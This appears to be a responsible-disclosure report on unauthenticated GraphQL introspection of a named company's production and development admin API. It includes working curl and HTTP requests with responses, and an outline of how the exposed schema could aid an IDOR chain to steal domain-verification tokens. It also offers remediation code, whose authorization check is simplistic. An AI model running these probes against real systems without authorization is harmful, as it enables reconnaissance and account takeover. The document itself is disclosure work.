# NIT-001: Unauthenticated Admin GraphQL Schema Introspection — api.gonitro.com

**Program:** Nitro Responsible Disclosure  
**Contact:** security@gonitro.com  
**Asset:** `api.gonitro.com` / `api.gonitrodev.com` (admin API)  
**Severity:** Medium  
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)  
**CWE:** CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor  
**Discovered:** 2026-06-29  
**Status:** Ready to submit

---

## Summary

The Nitro Admin GraphQL API at `https://api.gonitro.com/admin/v1/graphql` allows unauthenticated GraphQL introspection. Any anonymous HTTP client can retrieve the complete admin API schema — including type definitions for sensitive admin operations, domain verification tokens, SAML/SCIM identity provider configuration, and account management capabilities — without providing any authentication credentials.

Both the production endpoint and the development environment endpoint (`api.gonitrodev.com/admin/v1/graphql`) are affected.

---

## Evidence

### Step 1: Unauthenticated Schema Introspection (HTTP 200)

```http
POST /admin/v1/graphql HTTP/2
Host: api.gonitro.com
Content-Type: application/json

{"query":"{__schema{types{name}}}"}
```

**Response (HTTP 200, no authentication required):**
```json
{
  "data": {
    "__schema": {
      "types": [
        {"name": "Account"},
        {"name": "AccountDomain"},
        {"name": "AccountSort"},
        {"name": "AccountStatus"},
        {"name": "AccountType"},
        {"name": "AssignedLicense"},
        {"name": "Boolean"},
        {"name": "BuiltInTheme"},
        {"name": "Condition"},
        {"name": "Float"},
        {"name": "ID"},
        {"name": "IdPAccount"},
        {"name": "IdPAccountGroupDictionaryEntry"},
        {"name": "Int"},
        {"name": "Invitation"},
        {"name": "InvitationSort"},
        {"name": "License"},
        {"name": "MergeRequest"},
        {"name": "MergeRequestStatus"},
        {"name": "NLSEntity"},
        {"name": "PageInfo"},
        {"name": "PaginatedAccounts"},
        {"name": "PaginatedInvitations"},
        {"name": "PaginatedMergeRequests"},
        {"name": "PaginatedUsers"},
        {"name": "QueryRoot"},
        {"name": "SortOrder"},
        {"name": "String"},
        {"name": "Subscription"},
        {"name": "SubscriptionProduct"},
        {"name": "SubscriptionV2"},
        {"name": "Theme"},
        {"name": "User"},
        {"name": "UserSort"},
        {"name": "UserStatus"}
      ]
    }
  }
}
```

### Step 2: Sensitive Type Definitions Exposed

Introspecting individual types reveals sensitive field names that guide targeted attacks:

#### `AccountDomain` type — domain verification token exposed:

```http
POST /admin/v1/graphql HTTP/2
Host: api.gonitro.com
Content-Type: application/json

{"query":"{ __type(name: \"AccountDomain\") { name fields { name type { name kind } } } }"}
```

Response:
```json
{
  "data": {
    "__type": {
      "name": "AccountDomain",
      "fields": [
        {"name": "claimed", "type": {"name": "Boolean", "kind": "SCALAR"}},
        {"name": "createdAt", "type": {"name": "String", "kind": "SCALAR"}},
        {"name": "domain", "type": {"name": "String", "kind": "SCALAR"}},
        {"name": "token", "type": {"name": "String", "kind": "SCALAR"}}
      ]
    }
  }
}
```

The `token` field is the domain ownership verification token used in Nitro's domain claim workflow. Exposing its existence and name in the schema provides attackers with a precise target when conducting authenticated IDOR tests.

#### `IdPAccount` type — SAML and SCIM configuration fields:

```json
{
  "data": {
    "__type": {
      "name": "IdPAccount",
      "fields": [
        {"name": "acsURL"},
        {"name": "acsURLs"},
        {"name": "authenticationBroker"},
        {"name": "customLicenseMapping"},
        {"name": "enabled"},
        {"name": "groupDictionary"},
        {"name": "identityProviderId"},
        {"name": "jitProvisioning"},
        {"name": "samlEntityId"},
        {"name": "scimEnabled"},
        {"name": "scimEndpoint"}
      ]
    }
  }
}
```

This reveals the complete SAML/SSO and SCIM configuration schema for enterprise accounts — including `samlEntityId`, `scimEndpoint`, and `acsURL` fields — before any authentication is provided.

#### `Account` query with domain tokens:

```http
POST /admin/v1/graphql HTTP/2
Host: api.gonitro.com
Content-Type: application/json

{
  "query": "{ __schema { queryType { fields { name description args { name type { name kind } } } } } }"
}
```

Exposed admin queries:
```
account(id: NON_NULL) -> Account
  # Retrieve a single Account by its unique id.

accounts(domain, limit, name, offset, order, sfdcId, sortBy) -> PaginatedAccounts
  # Searches for accounts matching provided search terms.

invitations(accountId: NON_NULL, email, limit, offset, order, sortBy) -> PaginatedInvitations
  # Searches for account invitations matching provided search terms.

user(id: NON_NULL) -> User
  # Retrieve a single User by its unique id.

users(condition, email, firstName, lastName, licenses, limit, offset, order, sortBy, status) -> PaginatedUsers
  # Searches for users matching provided search terms.
```

### Step 3: Development Environment Also Affected

```bash
curl -s -X POST "https://api.gonitrodev.com/admin/v1/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
# Returns HTTP 200 with identical schema
```

---

## Attack Impact

### 1. Full Admin API Attack Surface Mapping

Any unauthenticated attacker can enumerate:
- Every admin query and mutation (name, arguments, return types)
- Every admin data type and all their fields
- Which fields are nullable vs. required (for precise injection testing)

This eliminates the trial-and-error phase of API reconnaissance and enables targeted authorization bypass attempts.

### 2. Domain Verification Token IDOR (Authenticated)

The `AccountDomain.token` field is the domain ownership verification token. Knowledge of this field's existence (from introspection) directly enables IDOR testing: an authenticated attacker from Organization A can craft a precise query to test whether `account(id: ORG_B_ID)` returns Organization B's domain verification token.

If IDOR is present in the `account()` resolver, an attacker can:
1. Obtain another organization's domain verification token
2. Claim that domain for their own account
3. Enable SSO/SAML for their org using another org's corporate domain

### 3. SAML/SCIM Configuration Enumeration (Authenticated)

The `IdPAccount.scimEndpoint` and `IdPAccount.samlEntityId` field exposure enables authenticated IDOR testing against SSO-configured enterprise accounts. Unauthorized access to these fields could:
- Reveal a competitor's IdP configuration
- Expose internal SCIM provisioning endpoints not intended for third parties

---

## Proof of Concept

```bash
# Production admin endpoint - no auth headers
curl -s -X POST "https://api.gonitro.com/admin/v1/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
# Expected: HTTP 200 with full type list

# Get sensitive type details (AccountDomain with token field)
curl -s -X POST "https://api.gonitro.com/admin/v1/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"AccountDomain\") { name fields { name } } }"}'
# Expected: HTTP 200 with: claimed, createdAt, domain, token

# Dev environment also affected
curl -s -X POST "https://api.gonitrodev.com/admin/v1/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'
# Expected: HTTP 200 with identical schema
```

---

## Root Cause

GraphQL introspection is enabled globally without authentication gating. While data resolvers correctly enforce authorization (queries return `"Unauthorized to access resource"` without valid credentials), the introspection system itself bypasses this authorization check.

The GraphQL specification does not require introspection to be publicly accessible. Production admin APIs should disable introspection entirely or restrict it to authenticated admin sessions.

---

## Remediation

### Option 1 (Recommended): Disable introspection on admin endpoint

Most GraphQL servers support disabling introspection at the framework level:

```python
# Apollo Server (Node.js)
ApolloServer({ introspection: process.env.NODE_ENV === 'development' })

# Graphene (Python)
graphql_schema.execute(query, middleware=[DisableIntrospectionMiddleware()])
```

### Option 2: Require authentication for introspection

Apply the same authorization middleware to `__schema` and `__type` queries as to data resolvers:

```javascript
// Apollo Server middleware
const server = new ApolloServer({
  plugins: [
    {
      requestDidStart() {
        return {
          willSendResponse({ request, response }) {
            if (request.query?.includes('__schema') && !request.http?.headers.get('authorization')) {
              response.http.status = 401;
            }
          }
        }
      }
    }
  ]
});
```

### Option 3: Field-level depth limiting

If full introspection disable is not feasible, apply depth and field count limits to prevent complete schema enumeration.

---

## References

- GraphQL Introspection Security: https://owasp.org/www-project-graphql-security-cheat-sheet/
- CWE-200: Information Exposure — https://cwe.mitre.org/data/definitions/200.html
- OWASP API Security — API6:2023 Unrestricted Access to Sensitive Business Flows
- Affected endpoints:
  - Production: `https://api.gonitro.com/admin/v1/graphql`
  - Development: `https://api.gonitrodev.com/admin/v1/graphql`
